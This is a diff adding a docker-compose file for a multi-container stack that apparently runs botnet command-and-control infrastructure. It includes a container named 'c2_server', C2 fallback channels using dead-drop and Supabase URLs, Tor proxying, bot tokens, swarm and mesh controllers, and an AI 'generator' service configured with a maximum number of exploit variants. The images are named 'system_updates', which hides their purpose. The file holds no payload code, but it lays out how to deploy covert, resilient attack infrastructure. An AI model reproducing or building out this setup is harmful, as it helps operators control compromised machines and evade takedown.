@@ -1,0 +1,362 @@
+version: '3.8'
+
+services:
+  postgres:
+    image: postgres:15-alpine
+    container_name: system_postgres
+    restart: unless-stopped
+    environment:
+      POSTGRES_DB: ${POSTGRES_DB:-systemdb}
+      POSTGRES_USER: ${POSTGRES_USER:-admin}
+      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-changeme}
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+      - ./database/schema.sql:/docker-entrypoint-initdb.d/schema.sql:ro
+    networks:
+      - internal
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER:-admin} -d ${POSTGRES_DB:-systemdb}"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  redis:
+    image: redis:7-alpine
+    container_name: system_redis
+    restart: unless-stopped
+    command: redis-server --appendonly yes
+    volumes:
+      - redis_data:/data
+    networks:
+      - internal
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  rabbitmq:
+    image: rabbitmq:3-management-alpine
+    container_name: system_rabbitmq
+    restart: unless-stopped
+    environment:
+      RABBITMQ_DEFAULT_USER: ${RABBITMQ_USER:-guest}
+      RABBITMQ_DEFAULT_PASS: ${RABBITMQ_PASS:-guest}
+    volumes:
+      - rabbitmq_data:/var/lib/rabbitmq
+    ports:
+      - "${RABBITMQ_PORT:-5672}:5672"
+      - "${RABBITMQ_MGMT_PORT:-15672}:15672"
+    networks:
+      - internal
+    healthcheck:
+      test: ["CMD", "rabbitmq-diagnostics", "ping"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  celery_worker:
+    build:
+      context: ./server
+      dockerfile: Dockerfile
+    image: system_updates_server
+    container_name: celery_worker
+    restart: unless-stopped
+    command: celery -A load_balancer worker --loglevel=info -Q default,high_priority,ai_tasks
+    environment:
+      - DATABASE_URL=postgresql://${POSTGRES_USER:-admin}:${POSTGRES_PASSWORD:-changeme}@postgres:5432/${POSTGRES_DB:-systemdb}
+      - REDIS_URL=redis://redis:6379/0
+      - CELERY_BROKER_URL=amqp://${RABBITMQ_USER:-guest}:${RABBITMQ_PASS:-guest}@rabbitmq:5672//
+    volumes:
+      - ./server:/app
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+      rabbitmq:
+        condition: service_healthy
+    networks:
+      - internal
+    deploy:
+      replicas: 2
+
+  celery_beat:
+    build:
+      context: ./server
+      dockerfile: Dockerfile
+    image: system_updates_server
+    container_name: celery_beat
+    restart: unless-stopped
+    command: celery -A load_balancer beat --loglevel=info
+    environment:
+      - DATABASE_URL=postgresql://${POSTGRES_USER:-admin}:${POSTGRES_PASSWORD:-changeme}@postgres:5432/${POSTGRES_DB:-systemdb}
+      - REDIS_URL=redis://redis:6379/0
+      - CELERY_BROKER_URL=amqp://${RABBITMQ_USER:-guest}:${RABBITMQ_PASS:-guest}@rabbitmq:5672//
+    volumes:
+      - ./server:/app
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+      rabbitmq:
+        condition: service_healthy
+    networks:
+      - internal
+
+  server:
+    build:
+      context: ./server
+      dockerfile: Dockerfile
+    image: system_updates_server
+    container_name: c2_server
+    restart: unless-stopped
+    ports:
+      - "${SERVER_PORT:-10000}:10000"
+    environment:
+      - MASTER_SECRET_B64=${MASTER_SECRET_B64}
+      - SALT=${SALT}
+      - ADMIN_ID=${ADMIN_ID}
+      - BOT_TOKENS=${BOT_TOKENS}
+      - SUPABASE_URLS=${SUPABASE_URLS}
+      - SUPABASE_KEYS=${SUPABASE_KEYS}
+      - DEAD_DROP_URLS=${DEAD_DROP_URLS}
+      - ACCESS_KEY=${ACCESS_KEY}
+      - USE_TOR=${USE_TOR:-false}
+      - TOR_PROXY=${TOR_PROXY:-socks5h://127.0.0.1:9050}
+      - USE_AI_C2=${USE_AI_C2:-false}
+      - AI_C2_ENDPOINTS=${AI_C2_ENDPOINTS}
+      - USE_BLOCKCHAIN=${USE_BLOCKCHAIN:-false}
+      - USE_P2P=${USE_P2P:-false}
+      - USE_MCP=${USE_MCP:-false}
+      - CONSENSUS_THRESHOLD=${CONSENSUS_THRESHOLD:-3}
+      - ANOMALY_THRESHOLD=${ANOMALY_THRESHOLD:-0.85}
+      - FEDERATED_MIN_CLIENTS=${FEDERATED_MIN_CLIENTS:-5}
+      - FEDERATED_INTERVAL=${FEDERATED_INTERVAL:-3600}
+      - SWARM_HEARTBEAT=${SWARM_HEARTBEAT:-300}
+      - MAX_EXPLOIT_VARIANTS=${MAX_EXPLOIT_VARIANTS:-3}
+      - LEARNING_RATE=${LEARNING_RATE:-0.1}
+      - REDIS_URL=redis://redis:6379/0
+      - CELERY_BROKER_URL=amqp://${RABBITMQ_USER:-guest}:${RABBITMQ_PASS:-guest}@rabbitmq:5672//
+      - DATABASE_URL=postgresql://${POSTGRES_USER:-admin}:${POSTGRES_PASSWORD:-changeme}@postgres:5432/${POSTGRES_DB:-systemdb}
+      - DEBUG_MODE=${DEBUG_MODE:-false}
+      - LOG_LEVEL=${LOG_LEVEL:-INFO}
+    volumes:
+      - ./server:/app
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+      rabbitmq:
+        condition: service_healthy
+    networks:
+      - internal
+
+  ai-orchestrator:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: ai_orchestrator
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - CONSENSUS_THRESHOLD=${CONSENSUS_THRESHOLD:-3}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  ai-hunter:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: ai_hunter
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - ANOMALY_THRESHOLD=${ANOMALY_THRESHOLD:-0.85}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  ai-analyzer:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: ai_analyzer
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  ai-generator:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: ai_generator
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - MAX_VARIANTS=${MAX_EXPLOIT_VARIANTS:-3}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  ai-validator:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: ai_validator
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - CONSENSUS_THRESHOLD=${CONSENSUS_THRESHOLD:-3}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  federated-learning:
+    build:
+      context: ./server/ai
+      dockerfile: Dockerfile.ai
+    image: system_updates_ai
+    container_name: federated_learning
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - MIN_CLIENTS=${FEDERATED_MIN_CLIENTS:-5}
+      - AGGREGATION_INTERVAL=${FEDERATED_INTERVAL:-3600}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  swarm-controller:
+    build:
+      context: ./server/swarm
+      dockerfile: Dockerfile.swarm
+    image: system_updates_swarm
+    container_name: swarm_controller
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - HEARTBEAT_INTERVAL=${SWARM_HEARTBEAT:-300}
+      - CONSENSUS_THRESHOLD=${CONSENSUS_THRESHOLD:-3}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  c2-fallbacks:
+    build:
+      context: ./server/c2
+      dockerfile: Dockerfile.c2
+    image: system_updates_c2
+    container_name: c2_fallbacks
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+      - SUPABASE_URLS=${SUPABASE_URLS}
+      - SUPABASE_KEYS=${SUPABASE_KEYS}
+      - DEAD_DROP_URLS=${DEAD_DROP_URLS}
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  mesh-manager:
+    build:
+      context: ./server/mesh
+      dockerfile: Dockerfile.mesh
+    image: system_updates_mesh
+    container_name: mesh_manager
+    restart: unless-stopped
+    environment:
+      - REDIS_URL=redis://redis:6379/0
+    networks:
+      - internal
+    depends_on:
+      redis:
+        condition: service_healthy
+
+  error-tracker:
+    build:
+      context: ./server/error
+      dockerfile: Dockerfile.error
+    image: system_updates_error
+    container_name: error_tracker
+    restart: unless-stopped
+    environment:
+      - DATABASE_URL=postgresql://${POSTGRES_USER:-admin}:${POSTGRES_PASSWORD:-changeme}@postgres:5432/${POSTGRES_DB:-systemdb}
+      - REDIS_URL=redis://redis:6379/0
+    networks:
+      - internal
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+
+  gateway:
+    build:
+      context: ./server/gateway
+      dockerfile: Dockerfile.gateway
+    image: system_updates_gateway
+    container_name: web_gateway
+    restart: unless-stopped
+    ports:
+      - "${GATEWAY_PORT:-8080}:8080"
+    environment:
+      - API_BASE=http://server:10000/api
+      - ACCESS_KEY=${ACCESS_KEY}
+    networks:
+      - internal
+    depends_on:
+      server:
+        condition: service_started
+
+  nginx:
+    image: nginx:alpine
+    container_name: nginx_proxy
+    restart: unless-stopped
+    ports:
+      - "${NGINX_PORT:-80}:80"
+      - "${NGINX_SSL_PORT:-443}:443"
+    volumes:
+      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
+      - ./nginx/ssl:/etc/nginx/ssl:ro
+    networks:
+      - internal
+    depends_on:
+      - server
+      - gateway
+
+networks:
+  internal:
+    driver: bridge
+
+volumes:
+  postgres_data:
+  redis_data:
+  rabbitmq_data:
